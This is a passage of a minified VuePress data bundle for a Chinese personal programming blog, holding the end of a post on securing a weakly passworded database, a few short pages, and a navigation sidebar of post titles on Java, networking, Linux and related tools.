也不是什么隐私数据，为数不多的几个用户密码，撞库都撞不出来，但是如果下次是重要数据怎么办呢？\n\n那肯定损失巨大，所以得从根源上解决问题！\n\n这次至少最大的问题在于我的数据库密码设置的是弱密码\n\n之前一直觉得无所谓，而且以前本地的数据库密码也喜欢设置成弱密码\n\n所以以后在设置密码的时候得避免弱密码的问题\n\n不仅仅是数据库，我突然一下都不敢用用户名密码登录服务器了，下次服务器又被攻击了可不好了，赶紧去配置了密钥",charsets:{cjk:!0},lastUpdated:"2022/05/28, 11:22:23",lastUpdatedTimestamp:1653708143e3},{title:"关于",frontmatter:{title:"关于",date:"2022-04-17T23:27:53.000Z",permalink:"/about/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/about.html",relativePath:"about.md",key:"v-c4eaae76",path:"/about/",headersStr:null,content:"# 关于",normalizedContent:"# 关于",charsets:{cjk:!0},lastUpdated:"2022/04/27, 12:32:09",lastUpdatedTimestamp:1651033929e3},{title:"收藏",frontmatter:{title:"收藏",date:"2022-04-17T23:27:53.000Z",permalink:"/collection/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/collection.html",relativePath:"collection.md",key:"v-35ef0056",path:"/collection/",headersStr:null,content:"# 收藏",normalizedContent:"# 收藏",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Home",frontmatter:{home:!0,heroText:"Kehao's blog",tagline:"人生如逆旅，我亦是行人",postList:"detailed"},regularPath:"/",relativePath:"index.md",key:"v-7f55e15e",path:"/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"windows 远程桌面连接 界面不一样的解决方案 如何切换会话",frontmatter:{title:"windows 远程桌面连接 界面不一样的解决方案 如何切换会话",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/db22b6/",categories:["软件使用","其他"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/13.%E5%85%B6%E4%BB%96/06.windows%20%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%20%E7%95%8C%E9%9D%A2%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%20%E5%A6%82%E4%BD%95%E5%88%87%E6%8D%A2%E4%BC%9A%E8%AF%9D.html",relativePath:"08.软件使用/13.其他/06.windows 远程桌面连接 界面不一样的解决方案 如何切换会话.md",key:"v-3e5dc954",path:"/pages/db22b6/",headersStr:null,content:"原文出处：https://blog.csdn.net/chelen_jak/article/details/110139457\n\n有时候使用远程桌面连接到WINDOWS服务器，会选择哪一个会话进行连接，当需要连接的会话被进程战胜的时候，出现连接失败， 当再次连接的时候会发现进入的界面和之前的不一样，这个时候怎么办呢？\n\n解决这群：调出任务管理器---》点击用户--》选择需要连接的列表中的一个用户---》右键单击--》连接，即可切换过来。",normalizedContent:"原文出处：https://blog.csdn.net/chelen_jak/article/details/110139457\n\n有时候使用远程桌面连接到windows服务器，会选择哪一个会话进行连接，当需要连接的会话被进程战胜的时候，出现连接失败， 当再次连接的时候会发现进入的界面和之前的不一样，这个时候怎么办呢？\n\n解决这群：调出任务管理器---》点击用户--》选择需要连接的列表中的一个用户---》右键单击--》连接，即可切换过来。",charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"三个基本问题",frontmatter:{title:"三个基本问题",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/9db3a9/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/01.%E4%B8%89%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98.html",relativePath:"06.网络/02.网络原理/02.数据链路层/01.三个基本问题.md",key:"v-3ef59e16",path:"/pages/9db3a9/",headersStr:null,content:" 1. 封装成帧\n 2. 透明传输\n 3. 差错检测",normalizedContent:" 1. 封装成帧\n 2. 透明传输\n 3. 差错检测",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3}],themeConfig:{nav:[{text:"首页",link:"/"},{text:"编程学习",link:"/",items:[{text:"教程网站",items:[{text:"菜鸟教程",link:"https://www.runoob.com/"},{text:"Java Guide",link:"https://javaguide.cn/"},{text:"Java全栈知识体系",link:"https://pdai.tech/"},{text:"GIT在线学习",link:"https://learngitbranching.js.org/?locale=zh_CN"},{text:"C语言中文网",link:"http://c.biancheng.net/"},{text:"廖雪峰",link:"https://www.liaoxuefeng.com/"},{text:"阮一峰的网络日志",link:"https://www.ruanyifeng.com/blog/"},{text:"美团技术团队",link:"https://tech.meituan.com"}]},{text:"工具类网站",items:[{text:"Github release加速下载",link:"https://d.serctl.com/"},{text:"BE JSON",link:"https://www.bejson.com/"},{text:"Markdown在线编辑器",link:"https://tool.lu/markdown/"}]}]},{text:"笔记",link:"/",items:[{text:"数据结构与算法",link:"/ds/"},{text:"python",link:"/python/"},{text:"安全",link:"/safe/"},{text:"java",link:"/java/"},{text:"操作系统",link:"/system/"},{text:"网络",link:"/network/"},{text:"密码学",link:"/cryptography/"},{text:"软件使用",link:"/software_use/"},{text:"教师资格证",link:"/teacher/"},{text:"数据库",link:"/database/"},{text:"消息队列",link:"/mq/"},{text:"微服务",link:"/microservice/"}]},{text:"生活学习",link:"/",items:[{text:"视频资源网站",items:[{text:"百度网盘视频资源",link:"https://c.wxbxkx.com/"},{text:"AGE动漫网",link:"https://www.agemys.com/"},{text:"爱恋动漫",link:"http://www.kisssub.org/"}]},{text:"烹饪学习",items:[{text:"程序员做饭指南",link:"https://cook.aiurs.co/"}]},{text:"软件下载",items:[{text:"果核剥壳",link:"https://www.ghxi.com/"}]}]},{text:"索引",link:"/archives/",items:[{text:"分类",link:"/categories/"},{text:"标签",link:"/tags/"},{text:"归档",link:"/archives/"}]},{text:"收藏",link:"/collection/"},{text:"关于",link:"/about/"}],sidebarDepth:2,logo:"/img/logo.png",repo:"chenkehao1998/my_blog_resource",searchMaxSuggestions:10,lastUpdated:"上次更新",docsDir:"docs",editLinks:!0,editLinkText:"编辑",categoryText:"随笔",bodyBgImg:["https://raw.githubusercontent.com/chenkehao1998/img_bed/master/image/index-2022-04-30-18-30-45.jpg","https://raw.githubusercontent.com/chenkehao1998/img_bed/master/image/index-2022-04-30-18-29-48.jpg","https://raw.githubusercontent.com/chenkehao1998/img_bed/master/image/index-2022-04-30-18-30-13.png","https://raw.githubusercontent.com/chenkehao1998/img_bed/master/image/index-2022-04-30-18-30-13.jpg"],sidebar:{"/01.数据结构与算法/":[{title:"leetcode",collapsable:!0,children:[["01.leetcode/124. 二叉树中的最大路径和.md","二叉树中的最大路径和","/pages/c0018a/"],["01.leetcode/178. 分数排名.md","分数排名","/pages/795a2d/"],["01.leetcode/196. 删除重复的电子邮箱.md","删除重复的电子邮箱","/pages/982656/"],["01.leetcode/210. 课程表 II.md","课程表 II","/pages/df92d1/"],["01.leetcode/324. 摆动排序 II.md","摆动排序 II","/pages/620bd9/"],["01.leetcode/329. 矩阵中的最长递增路径.md","矩阵中的最长递增路径","/pages/936e38/"]]},{title:"牛客网",collapsable:!0,children:[["02.牛客网/93.NC93 设计LRU缓存结构.md","NC93 设计LRU缓存结构","/pages/b79555/"]]},{title:"排序",collapsable:!0,children:[["03.排序/02.二分插入排序实现.md","二分插入排序实现","/pages/a90be1/"],["03.排序/03.快速排序代码实现（简单版）.md","快速排序代码实现（简单版）","/pages/9941e6/"],["03.排序/04.快速排序算法.md","快速排序算法","/pages/fc2f07/"]]},{title:"树",collapsable:!0,children:[["04.树/01.平衡二叉树.md","平衡二叉树","/pages/d681c3/"],["04.树/02.Hash树.md","Hash树","/pages/82d820/"],["04.树/03.trie树（前缀树_字典树）.md","trie树（前缀树_字典树）","/pages/f86449/"]]},{title:"搜索",collapsable:!0,children:[["05.搜索/01.记忆化搜索.md","记忆化搜索","/pages/9a57e6/"],["05.搜索/02.快速选择(Quickselect)算法：寻找第k大的元素.md","快速选择(Quickselect)算法：寻找第k大的元素","/pages/9a78a3/"]]}],catalogue:{},"/02.Python/":[["01.anaconda常用指令.md","anaconda常用指令","/pages/623446/"],["02.matplotlib解决中文显示问题_.md","matplotlib解决中文显示问题_","/pages/857fce/"],["03.matplotlib一个界面绘制多个图.md","matplotlib一个界面绘制多个图","/pages/0f29b1/"],["04.Python韦恩图绘制.md","Python韦恩图绘制","/pages/e08ab4/"],["05.python删除文件.md","python删除文件","/pages/1a164c/"]],"/03.安全/":[{title:"漏洞复现",collapsable:!0,children:[["01.漏洞复现/01.Apache Shiro系列漏洞利用以及实战总结.md","Apache Shiro系列漏洞利用以及实战总结","/pages/111aef/"],["01.漏洞复现/02.CVE-2020-2957复现.md","CVE-2020-2957复现","/pages/b2c493/"],["01.漏洞复现/03.CVE-2020-11989 漏洞复现.md","CVE-2020-11989 漏洞复现","/pages/294836/"]]},["02.浅谈漏洞来源(CVE,NVD,CNVD,CNNVD).md","浅谈漏洞来源(CVE,NVD,CNVD,CNNVD)","/pages/f26408/"]],"/04.java/":[{title:"基础",collapsable:!0,children:[["01.基础/01.java retry_详解.md","java retry_详解","/pages/da78ec/"],["01.基础/02.java_双重检查 线程安全的懒汉式单例模式.md","java_双重检查 线程安全的懒汉式单例模式","/pages/2b7746/"],["01.基础/03.java_volalite关键字.md","java_volalite关键字","/pages/225f1b/"],["01.基础/04.Java基础—break label 带标签的break语句的用法.md","Java基础—break label 带标签的break语句的用法","/pages/b5180a/"],["01.基础/05.java正则表达式.md","java正则表达式","/pages/2ccc12/"],["01.基础/06.java中的关键字 transient.md","java中的关键字 transient","/pages/328c06/"],["01.基础/07.Java终止线程的三种方式.md","Java终止线程的三种方式","/pages/a60cf2/"],["01.基础/08.Lombok注解-@SneakyThrows.md","Lombok注解-@SneakyThrows","/pages/3da978/"],["01.基础/09.String.intern().md","intern()","/pages/e8f31e/"],["01.基础/10.java 中为 final 变量赋值的几种方式.md","java 中为 final 变量赋值的几种方式","/pages/644e67/"],["01.基础/11.Java8 新特性之 Optional 正确理解和用法.md","Java8 新特性之 Optional 正确理解和用法","/pages/ee7b99/"]]},{title:"集合",collapsable:!0,children:[["02.集合/01.Collections.synchronizedMap().md","synchronizedMap()","/pages/4cb11b/"]]},{title:"多线程",collapsable:!0,children:[["03.多线程/00.java 多线程的基本使用.md","java 多线程的基本使用","/pages/c888ad/"],["03.多线程/01.java 线程池.md","java 线程池","/pages/6998f2/"],["03.多线程/02.java 有返回值的线程.md","java 有返回值的线程","/pages/1a6f48/"],["03.多线程/04.java 多线程 Threadlocal.md","java 多线程 Threadlocal","/pages/3f210f/"],["03.多线程/05.java JUC包实现多线程.md","java JUC包实现多线程","/pages/e50b43/"],["03.多线程/06.Java多线程让主线程等待子线程结束.md","Java多线程让主线程等待子线程结束","/pages/3bc47f/"],["03.多线程/09.使用 Condition, wait 和 notify 的替代品.md","使用 Condition, wait 和 notify 的替代品","/pages/a5c115/"],["03.多线程/10.一文彻底理解ReentrantLock可重入锁的使用.md","一文彻底理解ReentrantLock可重入锁的使用","/pages/062012/"],["03.多线程/11.阻塞队列使用ReentrantLock源码分析.md","阻塞队列使用ReentrantLock源码分析","/pages/7882c9/"]]},{title:"spring",collapsable:!0,children:[["04.spring/01.@Bean注解的方法参数自动注入规则(构造函数一样遵守).md","@Bean注解的方法参数自动注入规则(构造函数一样遵守)","/pages/d1b977/"],["04.spring/02.Spring Bean 生命周期之“我从哪里来”？.md","Spring Bean 生命周期之“我从哪里来”？","/pages/9e801a/"],["04.spring/03.Spring Bean 生命周期之“我要到哪里去”？.md","Spring Bean 生命周期之“我要到哪里去”？","/pages/73803e/"],["04.spring/04.Spring Aware 到底是个啥？.md","Spring Aware 到底是个啥？","/pages/3bd6af/"],["04.spring/05.spring bean的生命周期.md","spring bean的生命周期","/pages/1ac696/"],["04.spring/06.Spring MVC原理及配置详解.md","Spring MVC原理及配置详解","/pages/40850c/"],["04.spring/07.Spring中的FactoryBean接口.md","Spring中的FactoryBean接口","/pages/5e8cb5/"],["04.spring/08.SpringBoot应用启动过程分析.md","SpringBoot应用启动过程分析","/pages/a40320/"],["04.spring/09.springboot自定义starter时，starter内的配置文件不生效问题.md","springboot自定义starter时，starter内的配置文件不生效问题","/pages/63890e/"],["04.spring/10.springmvc _ 配置拦截器 interceptor.md","springmvc _ 配置拦截器 interceptor","/pages/441d52/"],["04.spring/11.SpringBoot 中 @Value 注解设置默认值.md","SpringBoot 中 @Value 注解设置默认值","/pages/a8f65a/"],["04.spring/12.Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma.md","Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma","/pages/1016ea/"],["04.spring/13.Spring IOC详解 以及 Bean生命周期详细过程.md","Spring IOC详解 以及 Bean生命周期详细过程","/pages/ecb5ee/"],["04.spring/14.自定义注解实现 AOP 日志记录.md","自定义注解实现 AOP 日志记录","/pages/718972/"],["04.spring/15.Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma.md","Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma","/pages/36cb7f/"],["04.spring/16.Spring IOC详解 以及 Bean生命周期详细过程.md","Spring IOC详解 以及 Bean生命周期详细过程","/pages/9ed795/"],["04.spring/17.自定义注解实现 AOP 日志记录.md","自定义注解实现 AOP 日志记录","/pages/9f6f65/"]]},{title:"jvm",collapsable:!0,children:[["05.jvm/01.垃圾收集器_.md","垃圾收集器_","/pages/e78c12/"],["05.jvm/02.内存屏障.md","内存屏障","/pages/ecc12f/"],["05.jvm/03.浅析java中的TLAB.md","浅析java中的TLAB","/pages/f0e774/"],["05.jvm/04.为啥加锁可以解决可见性问题呢？.md","为啥加锁可以解决可见性问题呢？","/pages/7844f9/"],["05.jvm/05.主内存和工作内存的关系.md","主内存和工作内存的关系","/pages/53d695/"],["05.jvm/06.jackson中@JsonProperty、@JsonIgnore等常用注解总结.md","jackson中@JsonProperty、@JsonIgnore等常用注解总结","/pages/f4ef8d/"],["05.jvm/07.Java OOM问题如何排查.md","Java OOM问题如何排查","/pages/8f8483/"],["05.jvm/08.java对象头.md","java对象头","/pages/bff2a8/"],["05.jvm/09.Java内存模型(JMM).md","Java内存模型(JMM)","/pages/1b51c8/"],["05.jvm/10.java强引用、弱引用、软引用、虚引用.md","java强引用、弱引用、软引用、虚引用","/pages/4be2cf/"],["05.jvm/11.JMM：Java内存模型.md","JMM：Java内存模型","/pages/a6fc4c/"],["05.jvm/12.JVM内存结构.md","JVM内存结构","/pages/016c1e/"],["05.jvm/13.java 创建对象过程 实例化和初始化.md","java 创建对象过程 实例化和初始化","/pages/126d5d/"]]},{title:" 解决问题",collapsable:!0,children:[["10. 解决问题/01.关于Maven创建module弹出被忽略(Ignored)的 Ignoredpom.xml文件如.md","Maven创建module弹出被忽略(Ignored)的Ignored—pom.xml文件解决办法","/pages/05cd74/"],["10. 解决问题/02.maven_mvn install报错：No compiler is provided in thi.md","maven_mvn install报错：No compiler is provided in thi","/pages/44afd3/"],["10. 解决问题/03.Ubuntu 查看 java 安装路径.md","Ubuntu 查看 java 安装路径","/pages/8aef30/"]]}],"/05.操作系统/":[{title:"进程和线程",collapsable:!0,children:[["01.进程和线程/01.进程通信：共享内存.md","进程通信：共享内存","/pages/ce2351/"],["01.进程和线程/02.进程通信：管道.md","进程通信：管道","/pages/36d761/"],["01.进程和线程/03.进程通信：消息队列.md","进程通信：消息队列","/pages/c35b74/"],["01.进程和线程/04.进程通信：信号.md","进程通信：信号","/pages/898735/"],["01.进程和线程/05.进程通信：信号量.md","进程通信：信号量","/pages/5a77b2/"]]},["02.操作系统原理：进程同步的几种方式及基本原理.md","操作系统原理：进程同步的几种方式及基本原理","/pages/c0d765/"],["03.软中断和硬中断.md","软中断和硬中断","/pages/71dc3f/"],["04.提升缓存的命中率.md","提升缓存的命中率","/pages/161e44/"],["05.直接映射 Cache ：cache存取过程.md","直接映射 Cache ：cache存取过程","/pages/850ee7/"],["06.Cache 伪共享.md","Cache 伪共享","/pages/5ed5ed/"],["07.MESI（缓存一致性协议）.md","MESI（缓存一致性协议）","/pages/941cba/"]],"/06.网络/":[{title:"网络协议",collapsable:!0,children:[{title:"http(s)",collapsable:!0,children:[["01.网络协议/01.http(s)/01.http auth认证 basic认证.md","http auth认证 basic认证","/pages/d113b5/"],["01.网络协议/01.http(s)/02.http auth认证 digest认证 摘要认证.md","http auth认证 digest认证 摘要认证","/pages/a1062f/"],["01.网络协议/01.http(s)/03.HTTP Bearer认证及JWT的使用.md","HTTP Bearer认证及JWT的使用","/pages/6ad155/"],["01.网络协议/01.http(s)/04.HTTPS 加密机制.md","HTTPS 加密机制","/pages/498541/"],["01.网络协议/01.http(s)/05.HTTP各种响应码.md","HTTP各种响应码","/pages/3584ce/"]]},{title:"tcp",collapsable:!0,children:[["01.网络协议/02.tcp/01.TCP释放连接时为什么time_wait状态必须等待2MSL时间.md","TCP释放连接时为什么time_wait状态必须等待2MSL时间","/pages/e500fe/"]]}]},{title:"网络原理",collapsable:!0,children:[{title:"物理层",collapsable:!0,children:[["02.网络原理/01.物理层/01.基本概念.md","基本概念","/pages/d35054/"],["02.网络原理/01.物理层/02.常见的调制方式.md","常见的调制方式","/pages/138a45/"],["02.网络原理/01.物理层/03.信道的极限容量.md","信道的极限容量","/pages/ce4dd5/"],["02.网络原理/01.物理层/04.信道复用.md","信道复用","/pages/eab216/"]]},{title:"数据链路层",collapsable:!0,children:[["02.网络原理/02.数据链路层/00.基本概念.md","基本概念","/pages/f64997/"],["02.网络原理/02.数据链路层/01.三个基本问题.md","三个基本问题","/pages/9db3a9/"],["02.网络原理/02.数据链路层/02.封装成帧.md","封装成帧","/pages/2fe809/"],["02.网络原理/02.数据链路层/03.差错检测.md","差错检测","/pages/85ca33/"],["02.网络原理/02.数据链路层/04.透明传输.md","透明传输","/pages/aca0b4/"],["02.网络原理/02.数据链路层/05.局域网.md","局域网","/pages/4c9634/"],["02.网络原理/02.数据链路层/06.信道共享技术.md","信道共享技术","/pages/4dd8b9/"],["02.网络原理/02.数据链路层/07.在数据链路层扩展以太网.md","在数据链路层扩展以太网","/pages/fbc441/"],["02.网络原理/02.数据链路层/08.CSMA_CD.md","CSMA_CD","/pages/f32202/"],["02.网络原理/02.数据链路层/09.mac地址.md","mac地址","/pages/5bdc4d/"],["02.网络原理/02.数据链路层/10.ppp协议.md","ppp协议","/pages/b365d3/"]]},{title:"网络层",collapsable:!0,children:[["02.网络原理/03.网络层/00.基本概念.md","基本概念","/pages/967962/"],["02.网络原理/03.网络层/01.分类的IP地址.md","分类的IP地址","/pages/4ea062/"],["02.网络原理/03.网络层/02.地址解析协议ARP.md","地址解析协议ARP","/pages/421246/"],["02.网络原理/03.网络层/03.转发的流程.md","转发的流程","/pages/da6b66/"],["02.网络原理/03.网络层/04.路由选择协议.md","路由选择协议","/pages/d86cb6/"],["02.网络原理/03.网络层/05.RIP.md","RIP","/pages/81e75c/"],["02.网络原理/03.网络层/06.RIP 协议中距离的定义.md","RIP 协议中距离的定义","/pages/cc9ecc/"],["02.网络原理/03.网络层/07.OSPF.md","OSPF","/pages/9693e5/"],["02.网络原理/03.网络层/08.BGP.md","BGP","/pages/681242/"],["02.网络原理/03.网络层/09.IP数据报格式.md","IP数据报格式","/pages/f9e6b1/"],["02.网络原理/03.网络层/10.划分子网.md","划分子网","/pages/e2c6cc/"],["02.网络原理/03.网络层/11.构建超网.md","构建超网","/pages/13d20f/"]]},{title:"传输层",collapsable:!0,children:[["02.网络原理/04.传输层/01.基本概念.md","基本概念","/pages/e86a28/"],["02.网络原理/04.传输层/02.TCP.md","TCP","/pages/16b1e4/"],["02.网络原理/04.传输层/03.UDP.md","UDP","/pages/fbe261/"],["02.网络原理/04.传输层/04.TCP_连接的释放 四次挥手.md","TCP_连接的释放 四次挥手","/pages/a83c1f/"],["02.网络原理/04.传输层/05.TCP：连接的建立，三次握手.md","TCP：连接的建立，三次握手","/pages/d0c978/"],["02.网络原理/04.传输层/06.TCP：停止等待协议.md","TCP：停止等待协议","/pages/b42ae6/"],["02.网络原理/04.传输层/07.TCP_连续ARQ协议.md","TCP_连续ARQ协议","/pages/566027/"],["02.网络原理/04.传输层/08.TCP_ 拥塞控制.md","TCP_ 拥塞控制","/pages/212921/"]]},{title:"应用层",collapsable:!0,children:[["02.网络原理/05.应用层/01.动态主机配置协议DHCP.md","动态主机配置协议DHCP","/pages/243302/"],["02.网络原理/05.应用层/02.统一资源定位符.md","统一资源定位符","/pages/b279d0/"],["02.网络原理/05.应用层/03.HTTP协议.md","HTTP协议","/pages/18fbb4/"],["02.网络原理/05.应用层/04.http请求报文详解.md","http请求报文详解","/pages/ea178c/"],["02.网络原理/05.应用层/05.http响应报文详解.md","http响应报文详解","/pages/616db0/"],["02.网络原理/05.应用层/06.DNS.md","DNS","/pages/19e439/"],["02.网络原理/05.应用层/07.DNS解析：递归查询.md","DNS解析：递归查询","/pages/fd2dd6/"],["02.网络原理/05.应用层/08.DNS解析：迭代查询.md","DNS解析：迭代查询","/pages/c8836d/"]]}]},{title:"问题解决",collapsable:!0,children:[["03.问题解决/01.本地Host文件解析域名后访问云服务器, 结果请求被拦截, 提示备案问题的解决方式.md","本地Host文件解析域名后访问云服务器, 结果请求被拦截, 提示备案问题的解决方式","/pages/dc49cf/"]]}],"/07.密码学/":[["01.SHA256算法.md","SHA256算法","/pages/b72d37/"]],"/08.软件使用/":[{title:"docker",collapsable:!0,children:[["01.docker/01.不建议docker部署数据库.md","不建议docker部署数据库","/pages/7ab8e7/"],["01.docker/02.docker镜像和容器的导入导出.md","docker镜像和容器的导入导出","/pages/801726/"],["01.docker/03.Docker容器的重启策略及docker run的--restart选项详解.md","Docker容器的重启策略及docker run的--restart选项详解","/pages/d946e8/"],["01.docker/04.Linux设置docker服务开机自启动以及容器自启动.md","Linux设置docker服务开机自启动以及容器自启动","/pages/08bb44/"],["01.docker/05.portainer的安装.md","portainer的安装","/pages/6a2cdf/"],["01.docker/06.docker-compose up与docker-compose up -d.md","docker-compose up与docker-compose up -d","/pages/84ac8b/"],["01.docker/07.Docker 入门之 docker-compose.md","Docker 入门之 docker-compose","/pages/a4f48e/"]]},{title:"FTP",collapsable:!0,children:[["02.FTP/01.Win10开启FTP与配置.md","Win10开启FTP与配置","/pages/2f837f/"]]},{title:"intellij idea",collapsable:!0,children:[["03.intellij idea/01.IDEA不显示service 服务窗口.md","IDEA不显示service 服务窗口","/pages/c43bb9/"],["03.intellij idea/02.IDEA查看接口或类的继承实现关系图.md","IDEA查看接口或类的继承实现关系图","/pages/258ff7/"],["03.intellij idea/03.idea查找和替换.md","idea查找和替换","/pages/c59997/"],["03.intellij idea/04.IDEA在当前类中查找方法快捷键.md","IDEA在当前类中查找方法快捷键","/pages/668262/"],["03.intellij idea/05.Idea在debug模式下,直接停止程序(不执行断点后的代码).md","Idea在debug模式下,直接停止程序(不执行断点后的代码)","/pages/d3b595/"],["03.intellij idea/06.intellij idea如何全局重命名变量、方法、文件夹名？.md","intellij idea如何全局重命名变量、方法、文件夹名？","/pages/4e3fff/"],["03.intellij idea/07.idea  git blame 查看代码是谁修改的.md","idea  git blame 查看代码是谁修改的","/pages/a2c2af/"]]},{title:"git",collapsable:!0,children:[["04.git/01.配置了代理之后，git clone等git操作速度依然很慢的解决办法.md","配置了代理之后，git clone等git操作速度依然很慢的解决办法","/pages/931104/"],["04.git/02.git 配置 SSH.md","git 配置 SSH","/pages/ea2d5c/"],["04.git/03.git 为 ssh 协议配置代理.md","git 为 ssh 协议配置代理","/pages/4bc0ff/"],["04.git/04.git cherry-pick 教程.md","git cherry-pick 教程","/pages/fc5ea7/"],["04.git/05.git 回滚 reset、revert.md","git 回滚 reset、revert","/pages/7dff3d/"],["04.git/06.git reset --hard --soft 与 git revert 的作用.md","git reset --hard --soft 与 git revert 的作用","/pages/f40b57/"],["04.git/07.git rm 命令.md","git rm 命令","/pages/a756b7/"],["04.git/08.git commit --amend 修改 git 提交记录用法详解.md","git commit --amend 修改 git 提交记录用法详解","/pages/ae252b/"],["04.git/09.git stash 详解.md","git stash 详解","/pages/d6c0e8/"]]},{title:"linux",collapsable:!0,children:[["05.linux/01.查看nohup.out 日志文件.md","out 日志文件","/pages/06acba/"],["05.linux/02.CentOS7使用firewall-cmd打开关闭防火墙与端口 以开放8080端口为例.md","CentOS7使用firewall-cmd打开关闭防火墙与端口 以开放8080端口为例","/pages/d3d28c/"],["05.linux/03.Linux 操作命令 less.md","Linux 操作命令 less","/pages/517024/"],["05.linux/04.Linux more命令 查看文件.md","Linux more命令 查看文件","/pages/55902c/"],["05.linux/05.linux ln链接命令.md","linux ln链接命令","/pages/24822c/"],["05.linux/06.linux su切换到 root 终端没有了颜色，解决办法.md","linux su切换到 root 终端没有了颜色，解决办法","/pages/4c35af/"],["05.linux/07.linux查看对方端口是否打开.md","linux查看对方端口是否打开","/pages/4e8039/"],["05.linux/09.linux解压缩 tar命令_.md","linux解压缩 tar命令_","/pages/0d2e25/"],["05.linux/10.linux解压缩 zip和unzip命令_.md","linux解压缩 zip和unzip命令_","/pages/faeee1/"],["05.linux/11.linux开机自启动.md","linux开机自启动","/pages/8a7764/"],["05.linux/12.linux无root用户密码,频繁操作需要提权的命令，不用每次都加sudo的方法.md","linux无root用户密码,频繁操作需要提权的命令，不用每次都加sudo的方法","/pages/4f0801/"],["05.linux/13.Linux中top命令参数详解.md","Linux中top命令参数详解","/pages/3e52ee/"],["05.linux/14.linux中whereis、which、find、location的区别和用法.md","linux中whereis、which、find、location的区别和用法","/pages/d88157/"],["05.linux/15.netstat命令的使用.md","netstat命令的使用","/pages/5f99fb/"],["05.linux/16.wsl 设置 root 为默认用户.md","wsl 设置 root 为默认用户","/pages/e5af11/"],["05.linux/17.wsl maven报错Non-resolvable parent POM for xxx.xxx解决.md","xxx解决","/pages/993fdc/"],["05.linux/18.zsh oh-my-zsh 插件.md","zsh oh-my-zsh 插件","/pages/a4d751/"],["05.linux/21.Temporary failure in name resolution（域名解析暂时失败）解决方法.md","Temporary failure in name resolution（域名解析暂时失败）解决方法","/pages/3a223a/"]]},{title:"nginx",collapsable:!0,children:[["06.nginx/01.nginx配置文件.md","nginx配置文件","/pages/99e032/"],["06.nginx/02.nginx反向代理.md","nginx反向代理","/pages/29f009/"],["06.nginx/03.nginx负载均衡.md","nginx负载均衡","/pages/3324a4/"]]},{title:"redis",collapsable:!0,children:[["07.redis/01.缓存穿透、缓存击穿、缓存雪崩区别和解决方案.md","缓存穿透、缓存击穿、缓存雪崩区别和解决方案","/pages/f2187d/"],["07.redis/02.如何保证缓存与数据库的双写一致性？.md","如何保证缓存与数据库的双写一致性？","/pages/391955/"],["07.redis/03.Raft选举算法.md","Raft选举算法","/pages/ff379d/"],["07.redis/04.Redis 持久化.md","Redis 持久化","/pages/d723a6/"],["07.redis/05.redis 的过期策略.md","redis 的过期策略","/pages/4af20a/"],["07.redis/06.redis 分布式竞争与解决.md","redis 分布式竞争与解决","/pages/4aaaf8/"],["07.redis/07.redis 高可用架构 ： Sentinel.md","redis 高可用架构 ： Sentinel","/pages/235e92/"],["07.redis/08.redis 高性能的原因.md","redis 高性能的原因","/pages/e8d59c/"],["07.redis/09.redis 内存淘汰机制.md","redis 内存淘汰机制","/pages/fcacdb/"],["07.redis/10.Redis 数据类型与相关命令.md","Redis 数据类型与相关命令","/pages/9ad74b/"],["07.redis/11.redis 运行机制.md","redis 运行机制","/pages/0d430b/"],["07.redis/12.redis 主从架构原理.md","redis 主从架构原理","/pages/f6b0d1/"],["07.redis/13.Redis使用“：”对key进行分类存储.md","Redis使用“：”对key进行分类存储","/pages/688701/"]]},{title:"scrapy",collapsable:!0,children:[["08.scrapy/01.scrapy parse不访问的解决办法.md","scrapy parse不访问的解决办法","/pages/c7abe7/"]]},{title:"elastic search",collapsable:!0,children:[["09.elastic search/01.相关概念.md","相关概念","/pages/0f7709/"],["09.elastic search/02.什么是倒排索引？.md","什么是倒排索引？","/pages/215c5e/"],["09.elastic search/03.ES读数据原理.md","ES读数据原理","/pages/845846/"],["09.elastic search/04.es搜索过程.md","es搜索过程","/pages/b3df3a/"],["09.elastic search/05.ES写数据的原理.md","ES写数据的原理","/pages/10a4eb/"],["09.elastic search/06.ES在数据量很大的情况下（数十亿级别）如何提高查询性能？.md","ES在数据量很大的情况下（数十亿级别）如何提高查询性能？","/pages/044840/"],["09.elastic search/07.ES的分布式架构原理.md","ES的分布式架构原理","/pages/4ea730/"]]},{title:"rabbitMQ",collapsable:!0,children:[["10.rabbitMQ/01.rabbitMQ _ Spring AMQP 的使用.md","rabbitMQ _ Spring AMQP 的使用","/pages/e21414/"],["10.rabbitMQ/02.rabbitMQ exchange 的使用.md","rabbitMQ exchange 的使用","/pages/594692/"],["10.rabbitMQ/03.rabbitMQ Srping AMQP 消息转换器.md","rabbitMQ Srping AMQP 消息转换器","/pages/003c85/"]]},{title:"vpn",collapsable:!0,children:[{title:"科学上网",collapsable:!0,children:[["11.vpn/01.科学上网/01.电脑clash 经常timedout解决办法.md","电脑clash 